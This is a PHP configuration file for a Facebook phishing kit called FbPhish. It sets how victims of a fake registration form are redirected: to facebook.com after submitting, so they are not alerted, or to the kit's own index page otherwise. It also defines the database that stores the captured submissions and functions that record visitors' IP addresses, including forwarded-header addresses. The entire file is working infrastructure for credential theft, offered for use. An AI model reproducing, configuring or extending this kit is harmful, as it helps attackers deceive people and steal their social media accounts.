<?
// This is the configuration of the FB phishing tool!
// Here you should define all database connection settings and other stuff
// ALL OPTIONS, EXCEPT DATABASE SETTINGS AND MESSAGES SHOULD BE SET WITH LOWERCASE LETTERS AND/OR NUMBERS


// FbPhish settings

// Config option 287:
//  TRUE: Redirect to facebook.com when poeple come on the register.php but did not submitted the form
//  FALSE: Do not redirect when poeple com on register.php but did not submitted the register form on index.ph
//  HOME: Redirect to /index.php when poeple are on register.php but did not submitted the register form
//  NOT TRUE OR FALSE: If this is not "true" the poeple will be redirected to the entered link(example: if you put in https://google.com in config_option__287 you  will be redirected to google when you get on register.php when you did not submitted the form!)
$config_option__287 = "true";

//Config option 301:
// If the form was completely filled in redirect to:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__301 = "facebook";

//Config option 302:
// If the form was NOT completely filled in redirect to:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__302 = "home";

// Config option 451:
// If the system encounters an SQL/PDO error:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__451 = "home";


// Database settings
$fbphish_sql_host = "localhost";
$fbphish_sql_user = "root";
$fbphish_sql_password = "";
$fbphish_sql_db = "fbphish";


// DO NOT TOUCH
// Defining global functions
function getIp() {
	$ip = $_SERVER['REMOTE_ADDR'];
	return $ip;
}

function getMetaIp() {
    $metaIp = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $metaIp = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $metaIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $metaIp;
}
